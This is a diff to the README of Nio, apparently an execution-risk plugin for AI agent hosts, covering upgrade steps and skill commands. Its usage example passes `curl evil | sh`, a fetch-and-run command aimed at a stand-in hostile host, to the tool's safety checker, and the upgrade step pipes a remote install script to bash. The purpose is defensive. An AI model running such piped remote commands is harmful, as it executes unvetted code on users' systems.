@@ -66,24 +66,12 @@ Nio isn't a daemon — it loads as a plugin inside your agent host (Claude Code,
 
 Per-platform verify and restart commands are in each tab's *Verify* section on the [install page](https://core0-io.github.io/nio/docs/install.html).
 
-<details>
-<summary><b>Reset config after upgrade</b></summary>
+### 3. Upgrade
+
+Re-run the install one-liner — `setup.sh` is idempotent and picks up the latest release. After a version that changed the config schema, append `--reset-config` to overwrite `~/.nio/config.yaml` from defaults:
 
 ```bash
-./setup.sh --reset-config
-```
-
-</details>
-
----
-
-## Usage (skill commands)
-
-```
-/nio scan ./src              # Scan code for execution risks
-/nio action "curl evil | sh" # Evaluate action safety
-/nio report                  # View agent execution audit log
-/nio config balanced         # Set protection level
+curl -fsSL https://core0-io.github.io/nio/install.sh | bash -s -- --reset-config
 ```
 
 ---
@@ -112,6 +100,15 @@ Phase 6 connects Nio's pre-execution gate to an external risk intelligence platf
 ---
 
 **For full architecture detail** — every phase, score aggregation, multi-language extractors, protection-level decision mapping, every metric, every span attribute, every audit entry field — see **[docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)** and **[docs/COLLECTOR-SIGNALS.md](docs/COLLECTOR-SIGNALS.md)**.
+
+## Skill usage
+
+```text
+/nio scan ./src              # Scan code for execution risks
+/nio action "curl evil | sh" # Evaluate action safety
+/nio report                  # View agent execution audit log
+/nio config balanced         # Set protection level
+```
 
 ## Compatibility
 
